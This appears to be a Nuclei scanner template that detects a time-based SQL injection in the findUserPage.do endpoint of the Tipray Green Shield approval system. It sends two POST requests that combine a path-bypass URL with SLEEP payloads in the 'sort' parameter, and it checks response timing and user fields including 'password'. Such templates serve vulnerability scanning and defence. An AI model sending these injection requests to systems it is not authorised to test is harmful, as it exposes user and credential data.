id: poc-yaml-tipray-gsas-finduserpage-do-sqli

info:
  name: "天锐绿盾审批系统 findUserPage.do SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: 天锐绿盾

http:
  - raw:
      - |
        POST /trwfe/service/.%2E/user/findUserPage.do HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        sort=(SELECT * FROM (SELECT(SLEEP(5)))x)
      - |
        POST /trwfe/service/.%2E/user/findUserPage.do HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        sort=(SELECT * FROM (SELECT(SLEEP(8)))x)
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"id":'
          - '"firstName":'
          - '"password":'
      - type: regex
        part: body
        regex:
          - "^[^<]*$"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
